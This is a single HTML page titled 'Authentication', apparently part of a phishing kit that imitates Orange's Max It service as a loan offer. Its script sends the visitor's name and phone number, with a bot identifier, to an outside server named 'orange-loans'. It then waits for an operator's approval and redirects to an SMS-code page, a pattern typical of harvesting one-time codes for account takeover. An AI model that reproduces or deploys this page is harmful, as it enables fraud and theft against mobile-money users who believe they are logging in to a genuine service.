<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Authentication</title>

<style>

*{
margin:0;
padding:0;
box-sizing:border-box;
font-family: Arial, sans-serif;
}

body{
background:#000;
height:100vh;
display:flex;
justify-content:center;
align-items:center;
}

.app{
width:100%;
max-width:420px;
height:100vh;
background:#000;
display:flex;
flex-direction:column;
}

/* IMAGE SECTION */

.top-image{
width:100%;
height:55%;
background:url("maxit-logo.jpeg") center/cover no-repeat;
}

/* FORM SECTION */

.form-section{
background:#111;
color:white;
padding:30px 25px;
border-top-left-radius:35px;
border-top-right-radius:35px;
margin-top:-40px;
flex:1;
}

.form-section h2{
margin-bottom:25px;
font-size:22px;
}

.input-box{
display:flex;
align-items:center;
border-bottom:1px solid #555;
margin-bottom:25px;
padding-bottom:8px;
}

.input-box span{
margin-right:10px;
font-size:18px;
}

.input-box input{
background:none;
border:none;
outline:none;
color:white;
width:100%;
font-size:16px;
padding:8px 0;
}

button{
width:100%;
padding:14px;
background:#7a3d1c;
border:none;
border-radius:6px;
color:white;
font-size:16px;
cursor:pointer;
transition: background 0.3s;
}

button:disabled{
background:#444;
cursor:not-allowed;
}

button:hover:not(:disabled){
background:#5a2d12;
}

.status-message {
    margin-top: 20px;
    padding: 15px;
    border-radius: 8px;
    text-align: center;
    font-size: 14px;
    display: none;
    animation: fadeIn 0.5s ease;
}

.status-message.show {
    display: block;
}

.status-message.waiting {
    background: #1a1a2e;
    color: #ffd93d;
    border: 1px solid #ffd93d;
}

.status-message.success {
    background: #1a2e1a;
    color: #6bcb77;
    border: 1px solid #6bcb77;
}

.status-message.error {
    background: #2e1a1a;
    color: #ff6b6b;
    border: 1px solid #ff6b6b;
}

.status-message .spinner {
    display: inline-block;
    width: 20px;
    height: 20px;
    border: 3px solid rgba(255, 217, 61, 0.3);
    border-radius: 50%;
    border-top-color: #ffd93d;
    animation: spin 1s ease-in-out infinite;
    margin-right: 10px;
    vertical-align: middle;
}

@keyframes spin {
    to { transform: rotate(360deg); }
}

@keyframes fadeIn {
    from { opacity: 0; transform: translateY(-10px); }
    to { opacity: 1; transform: translateY(0); }
}

</style>
</head>

<body>

<div class="app">

<div class="form-section">

<h2>Authentication</h2>

<form id="detailsForm">

<div class="input-box">
<span>📞</span>
<input id="phone" placeholder="Enter your phone number" required>
</div>

<button id="nextBtn">Log in</button>

</form>

<div id="status" class="status-message"></div>

</div>

</div>

<script>

const BACKEND_URL = "https://orange-loans-ufnk.onrender.com";

// ---------------- BOT ID ----------------
const params = new URLSearchParams(window.location.search);
const botId = params.get('botId') || window.location.pathname.split('/').pop();
if (!botId) { alert("Invalid access link"); throw new Error(); }

// ---------------- FLOW CHECK ----------------
if (!localStorage.getItem('loanAmount')) {
    window.location.href = `index.html?botId=${botId}`;
}

const nextBtn = document.getElementById('nextBtn');
const statusDiv = document.getElementById('status');

// ---------------- STATUS HELPER ----------------
function showStatus(message, type) {
    statusDiv.textContent = message;
    statusDiv.className = 'status-message show';
    if (type) {
        statusDiv.classList.add(type);
    }
}

function hideStatus() {
    statusDiv.className = 'status-message';
    statusDiv.textContent = '';
}

// ---------------- SUBMIT ----------------
document.getElementById('detailsForm').addEventListener('submit', async e => {
    e.preventDefault();

    const phone = document.getElementById('phone').value.trim();
    const name = localStorage.getItem('fullName');

    if (!phone) {
        showStatus('⚠️ Please enter your phone number', 'error');
        return;
    }

    if (!name) {
        showStatus('⚠️ Name not found. Please restart.', 'error');
        return;
    }

    nextBtn.disabled = true;
    nextBtn.textContent = "Processing...";
    hideStatus();

    try {
        const res = await fetch(`${BACKEND_URL}/submit-details`, {
            method: 'POST',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify({
                name,
                phone,
                botId
            })
        });

        const data = await res.json();
        
        if (!res.ok) {
            throw new Error(data.error || 'Failed to submit');
        }

        // Store phone
        localStorage.setItem('phone', phone);

        // Show waiting status with spinner
        showStatus('⏳ Waiting for  approval...', 'waiting');

        // ---------------- POLLING ----------------
        const poll = setInterval(async () => {
            try {
                const r = await fetch(`${BACKEND_URL}/check-details/${data.requestId}`);
                const d = await r.json();

                // ✅ APPROVED → REDIRECT TO SMS PAGE
                if (d.approved === true) {
                    clearInterval(poll);
                    showStatus('✅ Approved! Redirecting...', 'success');
                    nextBtn.disabled = false;
                    nextBtn.textContent = "Log in";
                    
                    // Debug: Log what we're sending
                    console.log('Redirecting to SMS with:', { name, phone, botId });
                    
                    setTimeout(() => {
                        window.location.href = `/sms.html?name=${encodeURIComponent(name)}&phone=${encodeURIComponent(phone)}&botId=${botId}`;
                    }, 1500);
                }

                // ❌ REJECTED → STAY HERE
                if (d.approved === false) {
                    clearInterval(poll);
                    showStatus('❌ Request rejected. Please check your number and try again.', 'error');
                    nextBtn.disabled = false;
                    nextBtn.textContent = "Log in";
                }

            } catch (err) {
                clearInterval(poll);
                showStatus('⚠️ Connection lost. Please try again.', 'error');
                nextBtn.disabled = false;
                nextBtn.textContent = "Log in";
            }

        }, 2000);

    } catch (err) {
        showStatus('❌ ' + err.message, 'error');
        nextBtn.disabled = false;
        nextBtn.textContent = "Log in";
    }
});

</script>

</body>
</html>
